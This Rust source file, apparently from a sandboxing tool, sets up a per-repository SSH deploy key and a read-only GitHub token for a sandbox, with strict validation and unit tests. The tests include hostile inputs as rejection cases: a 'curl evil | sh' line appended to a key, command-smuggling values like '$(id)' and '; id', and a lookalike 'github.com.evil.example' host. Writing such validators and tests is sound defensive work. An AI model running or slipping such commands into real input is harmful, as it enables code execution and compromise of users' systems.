//! Credentials for a sandbox: a deploy key for one repository, and a
//! read-only token for GitHub's API.
//!
//! Both are made so that the host never works inside the sandbox, and the
//! sandbox never decides what it is given:
//!
//! - A deploy key is generated by the sandbox user, in the sandbox home
//!   (`guest/deploy-key.sh`). `sv2` reads back the public key only, checks
//!   that it is one ed25519 key and nothing else, and keeps its own copy
//!   outside the sandbox. It then prints the command that adds that copy to
//!   the repository. The user runs the command; `sv2` does not. The
//!   repository in it is the one the user named, never one the sandbox
//!   reports.
//! - A token is typed or piped in on the host and handed to the sandbox's
//!   own `gh` on standard input. It is never an argument.

use std::ffi::OsString;
use std::io::{BufRead, IsTerminal, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, ExitCode, Stdio};

use sv2_common::Obelus;

use crate::ProfileLine;

/// The guest script. See the file.
const DEPLOY_KEY_SCRIPT: &str = include_str!("../../../guest/deploy-key.sh");
/// The ssh that chooses a key per repository, which the guest script
/// installs. See the file.
const GIT_SSH_WRAPPER: &str = include_str!("../../../guest/git-ssh.sh");

// ---------------------------------------------------------------------------
// Repositories and keys
// ---------------------------------------------------------------------------

/// `OWNER/REPO` on GitHub, as GitHub allows them to be named.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Repo {
    pub owner: String,
    pub name: String,
}

impl Repo {
    /// Accepts `OWNER/REPO`, with or without `.git`. Not a URL: what host it
    /// is on, and how it is reached, are not the caller's to choose here.
    pub fn parse(s: &str) -> Result<Repo, String> {
        let bad = || format!("'{s}' is not a repository; write it as OWNER/REPO");
        let (owner, name) = s.split_once('/').ok_or_else(bad)?;
        let name = name.strip_suffix(".git").unwrap_or(name);
        let owner_ok = (1..=39).contains(&owner.len())
            && owner
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'-')
            && !owner.starts_with('-')
            && !owner.ends_with('-');
        let name_ok = (1..=100).contains(&name.len())
            && name
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"._-".contains(&b))
            && name != "."
            && name != ".."
            && !name.starts_with('-');
        if !owner_ok || !name_ok {
            return Err(bad());
        }
        Ok(Repo {
            owner: owner.to_string(),
            name: name.to_string(),
        })
    }

    pub fn slug(&self) -> String {
        format!("{}/{}", self.owner, self.name)
    }
}

/// The key in what the sandbox printed, if that is exactly one ed25519
/// public key: `ssh-ed25519 BASE64 [comment]` on a single line. The comment
/// is dropped; it is the sandbox's text and is not shown to anyone.
///
/// An ed25519 public key is always 68 characters of base64 that begin with
/// the encoded key type.
pub fn public_key(output: &str) -> Result<String, String> {
    let refuse = || {
        format!(
            "the sandbox did not answer with one ed25519 public key. {}",
            Obelus("counterfeit sixpence")
        )
    };
    let line = output.strip_suffix('\n').unwrap_or(output);
    if line.contains('\n') || line.contains('\r') {
        return Err(refuse());
    }
    let mut words = line.split(' ');
    let (Some("ssh-ed25519"), Some(key)) = (words.next(), words.next()) else {
        return Err(refuse());
    };
    let key_ok = key.len() == 68
        && key.starts_with("AAAAC3NzaC1lZDI1NTE5AAAAI")
        && key
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/');
    if !key_ok {
        return Err(refuse());
    }
    Ok(format!("ssh-ed25519 {key}"))
}

use crate::passwd_home;

/// Where sv2 keeps its own copy of a public key: in the host user's home,
/// which no sandbox can write.
fn key_copy_path(profile: &str, repo: &Repo) -> Result<PathBuf, String> {
    let home = passwd_home().ok_or("cannot find your home directory")?;
    Ok(home
        .join(".local/state/sandvault2/deploy-keys")
        .join(profile)
        .join(format!("{}--{}.pub", repo.owner, repo.name)))
}

/// Forget the copies kept for a profile that has been removed. They are
/// public keys whose private halves went with the sandbox home.
pub fn forget_profile(profile: &str) {
    if !sv2_common::valid_profile(profile) {
        return;
    }
    if let Some(home) = passwd_home() {
        let dir = home
            .join(".local/state/sandvault2/deploy-keys")
            .join(profile);
        let _ = std::fs::remove_dir_all(dir);
    }
}

/// The command the user runs to add the key, as words.
pub fn add_key_command(repo: &Repo, key_file: &str, title: &str, write: bool) -> Vec<String> {
    let mut v: Vec<String> = ["gh", "repo", "deploy-key", "add", key_file, "--repo"]
        .map(String::from)
        .to_vec();
    v.push(repo.slug());
    v.push("--title".into());
    v.push(title.into());
    if write {
        v.push("--allow-write".into());
    }
    v
}

/// One word, quoted for a shell if it needs it.
fn shell_word(w: &str) -> String {
    let plain = !w.is_empty()
        && w.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"/._-=:@".contains(&b));
    if plain {
        w.to_string()
    } else {
        format!("'{}'", w.replace('\'', r"'\''"))
    }
}

pub fn deploy_key(p: &ProfileLine, session: Command, repo: &Repo, write: bool) -> ExitCode {
    let mut session = session;
    let out = session
        .stdin(Stdio::null())
        .stderr(Stdio::inherit())
        .output();
    let out = match out {
        Ok(o) => o,
        Err(e) => return crate::fail(&format!("cannot run sudo: {e}")),
    };
    if !out.status.success() {
        return crate::fail("the sandbox could not make the key (see above)");
    }
    let key = match public_key(&String::from_utf8_lossy(&out.stdout)) {
        Ok(k) => k,
        Err(e) => return crate::fail(&e),
    };
    // The host's own copy: what the command below adds is this file, which
    // the sandbox cannot change after it was checked.
    let path = match key_copy_path(&p.name, repo) {
        Ok(path) => path,
        Err(e) => return crate::fail(&e),
    };
    let written = (|| -> std::io::Result<()> {
        use std::os::unix::fs::DirBuilderExt;
        let dir = path.parent().expect("the path has a directory");
        std::fs::DirBuilder::new()
            .recursive(true)
            .mode(0o700)
            .create(dir)?;
        std::fs::write(&path, format!("{key}\n"))
    })();
    if let Err(e) = written {
        return crate::fail(&format!("{}: {e}", path.display()));
    }

    let title = format!("sv2 {}", p.account);
    let command: Vec<String> = add_key_command(repo, &path.to_string_lossy(), &title, write)
        .iter()
        .map(|w| shell_word(w))
        .collect();
    let access = if write {
        "read and WRITE access"
    } else {
        "read-only access"
    };
    println!(
        "A deploy key for {} is ready in the sandbox of profile '{}'.",
        repo.slug(),
        p.name
    );
    println!("It does nothing until you add it to the repository. To give the");
    println!(
        "sandbox {access} to {} and to nothing else, run:",
        repo.slug()
    );
    println!();
    println!("  {}", command.join(" "));
    println!();
    println!("Then, in a new session, git uses the key for that repository:");
    println!("  git clone git@github.com:{}.git", repo.slug());
    if !write {
        println!("For a key that may also push, run this again with --write.");
    }
    ExitCode::SUCCESS
}

/// The session arguments that run the guest script for `repo`.
pub fn deploy_key_args(repo: &Repo) -> Vec<OsString> {
    [
        "/bin/bash",
        "-c",
        DEPLOY_KEY_SCRIPT,
        "sv2-deploy-key",
        &repo.owner,
        &repo.name,
        GIT_SSH_WRAPPER,
    ]
    .map(OsString::from)
    .to_vec()
}

// ---------------------------------------------------------------------------
// The API token
// ---------------------------------------------------------------------------

/// What a token made for the sandbox may do: read, nothing else.
pub const TOKEN_PERMISSIONS: [&str; 5] = [
    "issues=read",        // gh issue list, view
    "pull_requests=read", // gh pr view, diff, review comments
    "contents=read",      // files, commits, branches, releases
    "actions=read",       // gh run view --log-failed
    "statuses=read",      // CI status on pull requests
];

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum TokenVerb {
    Login,
    Status,
    Logout,
}

/// A GitHub user or organization name.
pub fn valid_owner(s: &str) -> bool {
    Repo::parse(&format!("{s}/x")).is_ok()
}

/// GitHub's form for a new fine-grained token, filled in.
pub fn token_url(name: &str, days: u32, owner: Option<&str>) -> String {
    let mut url = format!(
        "https://github.com/settings/personal-access-tokens/new?name={name}&description=Read-only+API+access+for+a+sandvault2+sandbox&expires_in={days}"
    );
    if let Some(owner) = owner {
        url.push_str(&format!("&target_name={owner}"));
    }
    for permission in TOKEN_PERMISSIONS {
        url.push('&');
        url.push_str(permission);
    }
    url
}

/// The text of a small regular file. The directory may be one a sandbox
/// writes to, so a FIFO under the name must not block (`O_NONBLOCK`), and
/// nothing but a regular file is read.
fn small_file(path: &Path) -> Option<String> {
    use std::os::unix::fs::OpenOptionsExt;
    let file = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NONBLOCK)
        .open(path)
        .ok()?;
    if !file.metadata().ok()?.is_file() {
        return None;
    }
    let mut text = String::new();
    file.take(1 << 20).read_to_string(&mut text).ok()?;
    Some(text)
}

/// The address of the remote `origin` in the text of a git config file.
fn origin_url(config: &str) -> Option<&str> {
    let mut in_origin = false;
    for line in config.lines().map(str::trim) {
        if line.starts_with('[') {
            in_origin = line == "[remote \"origin\"]";
        } else if in_origin {
            if let Some((key, value)) = line.split_once('=') {
                if key.trim().eq_ignore_ascii_case("url") {
                    return Some(value.trim());
                }
            }
        }
    }
    None
}

/// The repository a git address names, if it is on github.com.
fn github_repo(url: &str) -> Option<Repo> {
    let path = [
        "git@github.com:",
        "ssh://git@github.com/",
        "https://github.com/",
        "git://github.com/",
    ]
    .iter()
    .find_map(|prefix| url.strip_prefix(prefix))?;
    Repo::parse(path.strip_suffix('/').unwrap_or(path)).ok()
}

/// The GitHub repository that the checkout around `dir` was cloned from.
///
/// The config file is read here and git is not run: the checkout may be one
/// a sandbox writes to, and a git config can name programs for git to run.
/// What is read is only ever shown to the user as a suggestion, and names
/// the owner on GitHub's form; the user chooses the repositories there.
pub fn repo_around(dir: &Path) -> Option<Repo> {
    let (top, dot_git) = dir
        .ancestors()
        .map(|d| (d, d.join(".git")))
        .find(|(_, g)| g.symlink_metadata().is_ok())?;
    // A worktree's `.git` is a file that names its directory, which in turn
    // names the directory that has the config.
    let git_dir = if dot_git.is_dir() {
        dot_git
    } else {
        let text = small_file(&dot_git)?;
        top.join(text.strip_prefix("gitdir:")?.trim())
    };
    let common = match small_file(&git_dir.join("commondir")) {
        Some(text) => git_dir.join(text.trim()),
        None => git_dir,
    };
    github_repo(origin_url(&small_file(&common.join("config"))?)?)
}

/// The token in what was typed or piped in, if it is a fine-grained one.
/// A classic token is refused: its `repo` scope writes to every repository
/// its owner can reach.
pub fn check_token(input: &str) -> Result<&str, String> {
    let token = input.trim();
    if token.is_empty() {
        return Err("no token was entered".to_string());
    }
    if token.starts_with("ghp_") {
        return Err("that is a classic token, whose 'repo' scope grants write access to every repository you can reach; make a fine-grained one".to_string());
    }
    if ["gho_", "ghu_", "ghs_", "ghr_"]
        .iter()
        .any(|p| token.starts_with(p))
    {
        return Err(
            "that is an OAuth or app token, not a fine-grained personal access token".to_string(),
        );
    }
    let body = token.strip_prefix("github_pat_").ok_or(
        "that is not a fine-grained GitHub token (they begin with github_pat_)".to_string(),
    )?;
    let body_ok = (20..=255).contains(&body.len())
        && body.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_');
    if !body_ok {
        return Err("the token has characters a token does not have; paste it again".to_string());
    }
    Ok(token)
}

/// Read a line from the terminal without showing it.
fn read_hidden(prompt: &str) -> std::io::Result<String> {
    use std::os::fd::AsRawFd;
    let stdin = std::io::stdin();
    let fd = stdin.as_raw_fd();
    eprint!("{prompt}");
    std::io::stderr().flush()?;
    // SAFETY: `fd` is standard input, and `saved` is filled by tcgetattr
    // before it is read.
    let saved = unsafe {
        let mut t: libc::termios = std::mem::zeroed();
        if libc::tcgetattr(fd, &mut t) != 0 {
            return Err(std::io::Error::last_os_error());
        }
        let saved = t;
        t.c_lflag &= !libc::ECHO;
        libc::tcsetattr(fd, libc::TCSANOW, &t);
        saved
    };
    let mut line = String::new();
    let read = stdin.lock().read_line(&mut line);
    // SAFETY: restoring what tcgetattr returned.
    unsafe { libc::tcsetattr(fd, libc::TCSANOW, &saved) };
    eprintln!();
    read.map(|_| line)
}

/// Whether to color what is printed: on a terminal, unless `NO_COLOR` is set.
fn paint(terminal: bool) -> bool {
    terminal && std::env::var_os("NO_COLOR").is_none_or(|v| v.is_empty())
}

/// What `gh-token login` says before it asks for the token. GitHub's form
/// cannot be given the repositories, so the user is told which to choose.
fn token_steps(url: &str, repo: Option<&Repo>, opening: bool, color: bool) -> String {
    let style = |code: &str, text: &str| match color {
        true => format!("\x1b[{code}m{text}\x1b[0m"),
        false => text.to_string(),
    };
    let bold = |text: &str| style("1", text);
    let select = match repo {
        Some(repo) => format!("select {}", style("1;35", &repo.slug())),
        None => "select the repositories the agent needs".to_string(),
    };
    let open = match opening {
        true => "This page is opening in your browser:",
        false => "Open this page in your browser:",
    };
    format!(
        "\n{title}\n\n  \
         {one} {open}\n\n     {link}\n\n  \
         {two} Under {access}, choose {only}\n     and {select}. \
         The agent can read those\n     \
         repositories and no others.\n\n  \
         {three} Press {generate} and copy the token.\n\n",
        title = bold("Make a read-only GitHub token for the sandbox"),
        one = bold("1."),
        two = bold("2."),
        three = bold("3."),
        link = style("36", url),
        access = bold("Repository access"),
        only = bold("Only select repositories"),
        generate = bold("Generate token"),
    )
}

const GH_STATUS: [&str; 5] = ["gh", "auth", "status", "--hostname", "github.com"];

pub struct TokenOptions {
    pub verb: TokenVerb,
    pub owner: Option<String>,
    /// The repository of the directory `sv2` was run in, to suggest.
    pub repo: Option<Repo>,
    pub days: u32,
    pub open_browser: bool,
}

/// `session` builds a command that runs its arguments in the profile's
/// sandbox.
pub fn gh_token(
    p: &ProfileLine,
    session: &dyn Fn(&[OsString]) -> Command,
    opts: &TokenOptions,
) -> ExitCode {
    let words = |v: &[&str]| -> Vec<OsString> { v.iter().map(OsString::from).collect() };
    let run = |args: &[&str], input: Option<&str>| -> std::io::Result<bool> {
        let mut cmd = session(&words(args));
        cmd.stdin(if input.is_some() {
            Stdio::piped()
        } else {
            Stdio::null()
        });
        let mut child = cmd.spawn()?;
        if let (Some(text), Some(mut pipe)) = (input, child.stdin.take()) {
            pipe.write_all(text.as_bytes())?;
        }
        Ok(child.wait()?.success())
    };
    let report = |r: std::io::Result<bool>, what: &str| match r {
        Ok(true) => ExitCode::SUCCESS,
        Ok(false) => crate::fail(what),
        Err(e) => crate::fail(&format!("cannot run sudo: {e}")),
    };
    match opts.verb {
        TokenVerb::Status => {
            return report(run(&GH_STATUS, None), "gh in the sandbox is not logged in")
        }
        TokenVerb::Logout => {
            let code = report(
                run(&["gh", "auth", "logout", "--hostname", "github.com"], None),
                "gh auth logout failed in the sandbox",
            );
            eprintln!("sv2: the token is still valid until you revoke it: https://github.com/settings/personal-access-tokens");
            return code;
        }
        TokenVerb::Login => {}
    }

    let input = if std::io::stdin().is_terminal() {
        let name: String = format!("sv2-{}", p.account).chars().take(40).collect();
        let owner = opts
            .owner
            .as_deref()
            .or(opts.repo.as_ref().map(|r| r.owner.as_str()));
        let url = token_url(&name, opts.days, owner);
        eprint!(
            "{}",
            token_steps(
                &url,
                opts.repo.as_ref(),
                opts.open_browser,
                paint(std::io::stderr().is_terminal())
            )
        );
        if opts.open_browser {
            let _ = Command::new("/usr/bin/open")
                .arg(&url)
                .current_dir("/")
                .stdin(Stdio::null())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status();
        }
        read_hidden("Paste the token here (not shown): ")
    } else {
        let mut line = String::new();
        std::io::stdin().lock().read_line(&mut line).map(|_| line)
    };
    let input = match input {
        Ok(text) => text,
        Err(e) => return crate::fail(&format!("cannot read the token: {e}")),
    };
    let token = match check_token(&input) {
        Ok(t) => t,
        Err(e) => return crate::fail(&e),
    };
    // On standard input, never on a command line: those are logged.
    let installed = run(
        &[
            "/bin/sh",
            "-c",
            "umask 077; exec gh auth login --hostname github.com --with-token --insecure-storage --git-protocol ssh --skip-ssh-key",
        ],
        Some(&format!("{token}\n")),
    );
    match installed {
        Ok(true) => {}
        Ok(false) => return crate::fail("gh in the sandbox did not accept the token (see above)"),
        Err(e) => return crate::fail(&format!("cannot run sudo: {e}")),
    }
    let _ = run(&GH_STATUS, None);
    eprintln!(
        "sv2: gh in the sandbox of profile '{}' can now read from GitHub.",
        p.name
    );
    eprintln!("sv2: revoke the token when it is no longer needed: https://github.com/settings/personal-access-tokens");
    ExitCode::SUCCESS
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn repositories() {
        let r = |s: &str| Repo::parse(s).map(|r| r.slug());
        assert_eq!(r("octocat/Hello-World"), Ok("octocat/Hello-World".into()));
        assert_eq!(
            r("octocat/Hello-World.git"),
            Ok("octocat/Hello-World".into())
        );
        assert_eq!(r("a-b/c.d_e-f"), Ok("a-b/c.d_e-f".into()));
        for bad in [
            "",
            "octocat",
            "/repo",
            "octocat/",
            "octocat/a/b",
            "https://github.com/octocat/repo",
            "git@github.com:octocat/repo",
            "-octocat/repo",
            "octocat-/repo",
            "oct ocat/repo",
            "octocat/re po",
            "octocat/..",
            "octocat/.",
            "octocat/-rf",
            "octocat/repo;id",
            "octocat/$(id)",
            "octo_cat/repo",
        ] {
            assert!(Repo::parse(bad).is_err(), "{bad:?}");
        }
    }

    const KEY: &str =
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqZw6tUib7/lRkw/aIPak8SwGwvswAzS/x4OZprh0Mf";

    #[test]
    fn only_one_ed25519_key_is_a_public_key() {
        // As ssh-keygen writes it; the comment is dropped.
        assert_eq!(
            public_key(&format!("{KEY} sv2 deploy key for octocat/Hello-World\n")),
            Ok(KEY.to_string())
        );
        assert_eq!(public_key(KEY), Ok(KEY.to_string()));
        let body = KEY.strip_prefix("ssh-ed25519 ").unwrap();
        let cases = [
            ("nothing", String::new()),
            ("two keys", format!("{KEY}\n{KEY}\n")),
            ("a key and a line", format!("{KEY}\nrun: curl evil | sh\n")),
            ("a line and a key", format!("hello\n{KEY}\n")),
            (
                "a carriage return",
                format!("{KEY}\rgh repo deploy-key add\n"),
            ),
            ("another key type", format!("ssh-rsa {body}\n")),
            (
                "a private key",
                "-----BEGIN OPENSSH PRIVATE KEY-----\n".to_string(),
            ),
            ("a short key", format!("ssh-ed25519 {}\n", &body[..60])),
            ("a long key", format!("ssh-ed25519 {body}AAAA\n")),
            ("not base64", format!("ssh-ed25519 {}$(id)\n", &body[..62])),
            (
                "another type inside",
                format!("ssh-ed25519 {}\n", "A".repeat(68)),
            ),
            ("leading space", format!(" {KEY}\n")),
            ("options first", format!("command=\"x\" {KEY}\n")),
        ];
        for (why, text) in cases {
            let err = public_key(&text).expect_err(why);
            assert!(
                err.contains("did not answer with one ed25519 public key"),
                "{why}"
            );
        }
    }

    #[test]
    fn the_command_names_the_users_repository_and_the_hosts_file() {
        let repo = Repo::parse("octocat/Hello-World").unwrap();
        let file =
            "/Users/pat/.local/state/sandvault2/deploy-keys/default/octocat--Hello-World.pub";
        assert_eq!(
            add_key_command(&repo, file, "sv2 sv2-pat-default", false),
            [
                "gh",
                "repo",
                "deploy-key",
                "add",
                file,
                "--repo",
                "octocat/Hello-World",
                "--title",
                "sv2 sv2-pat-default"
            ]
        );
        // Write access is the user's to ask for, and shows.
        assert_eq!(
            add_key_command(&repo, file, "t", true)
                .last()
                .map(String::as_str),
            Some("--allow-write")
        );
        assert_eq!(shell_word("sv2 sv2-pat-default"), "'sv2 sv2-pat-default'");
        assert_eq!(shell_word(file), file);
        assert_eq!(shell_word("it's"), r"'it'\''s'");
        assert_eq!(shell_word(""), "''");
    }

    #[test]
    fn the_guest_script_is_given_the_repository_as_two_words() {
        let repo = Repo::parse("octocat/Hello-World").unwrap();
        let args = deploy_key_args(&repo);
        assert_eq!(args[0], "/bin/bash");
        assert_eq!(args[2], DEPLOY_KEY_SCRIPT);
        assert_eq!(&args[4..6], ["octocat", "Hello-World"]);
        assert_eq!(args[6], GIT_SSH_WRAPPER);
        assert_eq!(args.len(), 7);
    }

    /// The wrapper's decision, for a sandbox that has a key for acme/api:
    /// the ssh command line it would run, as words.
    fn wrapper_runs(args: &[&str]) -> Vec<String> {
        let home = std::env::temp_dir().join(format!(
            "sv2-wrapper-test-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let dir = home.join(".ssh/sv2-deploy-keys");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("acme--api"), "not a real key\n").unwrap();
        let out = Command::new("/bin/bash")
            .args(["-c", GIT_SSH_WRAPPER, "sv2-git-ssh"])
            .args(args)
            .env_clear()
            .env("HOME", &home)
            .env("SV2_DEPLOY_KEY_DRY_RUN", "1")
            .output()
            .unwrap();
        std::fs::remove_dir_all(&home).unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(str::to_string)
            .collect()
    }

    fn uses_key(words: &[String]) -> bool {
        words
            .iter()
            .any(|w| w.ends_with("/.ssh/sv2-deploy-keys/acme--api"))
    }

    #[test]
    fn the_wrapper_offers_a_key_to_exactly_its_repository() {
        // Every way git names the repository to ssh.
        for command in [
            "git-upload-pack 'acme/api.git'",
            "git-upload-pack 'acme/api'",
            "git-receive-pack 'acme/api.git'",
            "git-upload-pack '/acme/api.git'",
            "git-upload-pack 'Acme/API.git'",
        ] {
            let words = wrapper_runs(&["-o", "SendEnv=GIT_PROTOCOL", "git@github.com", command]);
            assert!(uses_key(&words), "{command}: {words:?}");
            // That key and no other, with the pinned host key; and git's
            // own arguments after ours, unchanged.
            assert_eq!(words[0], "/usr/bin/ssh");
            assert_eq!(words[1], "-i");
            assert!(words.contains(&"IdentitiesOnly=yes".to_string()));
            assert!(words.contains(&"StrictHostKeyChecking=yes".to_string()));
            assert_eq!(
                &words[words.len() - 4..],
                ["-o", "SendEnv=GIT_PROTOCOL", "git@github.com", command]
            );
        }
    }

    #[test]
    fn the_wrapper_is_plain_ssh_for_everything_else() {
        let plain = |args: &[&str]| {
            let words = wrapper_runs(args);
            assert!(!uses_key(&words), "{args:?}: {words:?}");
            let mut expected = vec!["/usr/bin/ssh".to_string()];
            expected.extend(args.iter().map(|a| (*a).to_string()));
            assert_eq!(words, expected, "{args:?}");
        };
        // Repositories whose names merely begin with the keyed one's.
        plain(&["git@github.com", "git-upload-pack 'acme/api-docs.git'"]);
        plain(&["git@github.com", "git-upload-pack 'acme/api2.git'"]);
        plain(&["git@github.com", "git-upload-pack 'acme/api.git.git'"]);
        plain(&["git@github.com", "git-upload-pack 'acme-inc/api.git'"]);
        plain(&["git@github.com", "git-upload-pack 'other/api.git'"]);
        // Another host with the same path.
        plain(&["git@gitlab.com", "git-upload-pack 'acme/api.git'"]);
        plain(&[
            "git@github.com.evil.example",
            "git-upload-pack 'acme/api.git'",
        ]);
        // Not git's use of ssh: a login, another command, a path that is
        // not a repository, something trailing.
        plain(&["git@github.com"]);
        plain(&["-T", "git@github.com"]);
        plain(&["git@github.com", "ls 'acme/api.git'"]);
        plain(&["git@github.com", "git-upload-pack 'acme/api.git'; id"]);
        plain(&["git@github.com", "git-upload-pack '../acme/api.git'"]);
        plain(&["git@github.com", "git-upload-pack 'acme/api/x.git'"]);
        plain(&[]);
    }

    #[test]
    fn tokens() {
        // Stand-ins, put together here so that no file holds text a secret
        // scanner would take for a real token.
        let body = "abcdefghijklmnopqrstuvwxyz0123456789";
        let fake = |prefix: &str| format!("{prefix}_{body}");
        let good = format!("github_pat_{}", "A1b2C3d4E5_f6G7h8I9j0K");
        assert_eq!(check_token(&format!("  {good}\n")), Ok(good.as_str()));
        let cases = [
            (String::new(), "no token"),
            (fake("ghp"), "classic token"),
            (fake("gho"), "OAuth or app token"),
            (fake("ghs"), "OAuth or app token"),
            ("hunter2".to_string(), "not a fine-grained"),
            (
                "github_pat_short".to_string(),
                "characters a token does not have",
            ),
            (
                "github_pat_abcdefghijklmnopqrstu; id".to_string(),
                "characters a token does not have",
            ),
        ];
        for (bad, why) in cases {
            let err = check_token(&bad).unwrap_err();
            assert!(err.contains(why), "{bad:?}: {err}");
        }
    }

    #[test]
    fn the_token_form_asks_for_reading_only() {
        let url = token_url("sv2-sv2-pat-default", 90, Some("octo-org"));
        assert!(url.starts_with(
            "https://github.com/settings/personal-access-tokens/new?name=sv2-sv2-pat-default&"
        ));
        assert!(
            url.contains("&expires_in=90&target_name=octo-org&"),
            "{url}"
        );
        for permission in TOKEN_PERMISSIONS {
            assert!(permission.ends_with("=read"), "{permission}");
            assert!(url.contains(&format!("&{permission}")), "{url}");
        }
        assert!(!url.contains("write"));
        assert!(!token_url("n", 30, None).contains("target_name"));
        assert!(valid_owner("octo-org") && !valid_owner("octo org") && !valid_owner("a/b"));
    }

    #[test]
    fn the_steps_name_the_repository_to_select() {
        let repo = Repo::parse("acme/api").unwrap();
        let plain = token_steps("https://x/new", Some(&repo), true, false);
        assert!(!plain.contains('\x1b'), "{plain:?}");
        assert!(plain.contains("\n     https://x/new\n"), "{plain}");
        assert!(plain.contains("opening in your browser"), "{plain}");
        assert!(
            plain.contains(
                "choose Only select repositories\n     and select acme/api. The agent can read"
            ),
            "{plain}"
        );
        // The permissions are on the form; they are not listed again.
        assert!(!plain.contains("=read"), "{plain}");

        let none = token_steps("https://x/new", None, false, false);
        assert!(none.contains("Open this page in your browser:"), "{none}");
        assert!(
            none.contains("and select the repositories the agent needs. The agent"),
            "{none}"
        );

        let colored = token_steps("https://x/new", Some(&repo), true, true);
        assert!(
            colored.contains("\x1b[36mhttps://x/new\x1b[0m"),
            "{colored:?}"
        );
        assert!(colored.contains("\x1b[1;35macme/api\x1b[0m"), "{colored:?}");
    }

    #[test]
    fn origin_on_github_is_a_repository() {
        let r = |url: &str| github_repo(url).map(|r| r.slug());
        for url in [
            "git@github.com:acme/api.git",
            "git@github.com:acme/api",
            "ssh://git@github.com/acme/api.git",
            "https://github.com/acme/api.git",
            "https://github.com/acme/api/",
            "git://github.com/acme/api",
        ] {
            assert_eq!(r(url), Some("acme/api".into()), "{url}");
        }
        for url in [
            "",
            "git@gitlab.com:acme/api.git",
            "https://github.com.evil.example/acme/api",
            "https://github.com/acme",
            "https://github.com/acme/api/tree/main",
            "git@github.com:acme/api;id",
            "/Users/Shared/acme/api",
        ] {
            assert_eq!(r(url), None, "{url}");
        }

        let config = "[core]\n\turl = git@github.com:not/this.git\n\
                      [remote \"upstream\"]\n\turl = git@github.com:nor/this.git\n\
                      [remote \"origin\"]\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n\
                      \tURL = git@github.com:acme/api.git\n\
                      [branch \"main\"]\n\turl = git@github.com:nor/that.git\n";
        assert_eq!(origin_url(config), Some("git@github.com:acme/api.git"));
        assert_eq!(origin_url("[remote \"upstream\"]\n\turl = x\n"), None);
    }

    #[test]
    fn the_repository_around_a_directory() {
        let root = std::env::temp_dir().join(format!("sv2-repo-around-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let config = "[remote \"origin\"]\n\turl = git@github.com:acme/api.git\n";

        // A checkout, from a directory inside it.
        let clone = root.join("clone");
        std::fs::create_dir_all(clone.join(".git")).unwrap();
        std::fs::create_dir_all(clone.join("src/deep")).unwrap();
        std::fs::write(clone.join(".git/config"), config).unwrap();
        let slug = |d: &Path| repo_around(d).map(|r| r.slug());
        assert_eq!(slug(&clone.join("src/deep")), Some("acme/api".into()));

        // A worktree of it, whose `.git` is a file.
        let tree = root.join("tree");
        let admin = clone.join(".git/worktrees/tree");
        std::fs::create_dir_all(&tree).unwrap();
        std::fs::create_dir_all(&admin).unwrap();
        std::fs::write(admin.join("commondir"), "../..\n").unwrap();
        std::fs::write(tree.join(".git"), format!("gitdir: {}\n", admin.display())).unwrap();
        assert_eq!(slug(&tree), Some("acme/api".into()));

        // No checkout, and a config that is not a file: a FIFO there would
        // block a plain open for good.
        assert_eq!(slug(&root), None);
        let fifo = root.join("fifo");
        std::fs::create_dir_all(fifo.join(".git")).unwrap();
        let name = std::ffi::CString::new(fifo.join(".git/config").to_str().unwrap()).unwrap();
        // SAFETY: `name` is a C string that outlives the call.
        assert_eq!(unsafe { libc::mkfifo(name.as_ptr(), 0o600) }, 0);
        assert_eq!(slug(&fifo), None);

        std::fs::remove_dir_all(&root).unwrap();
    }
}
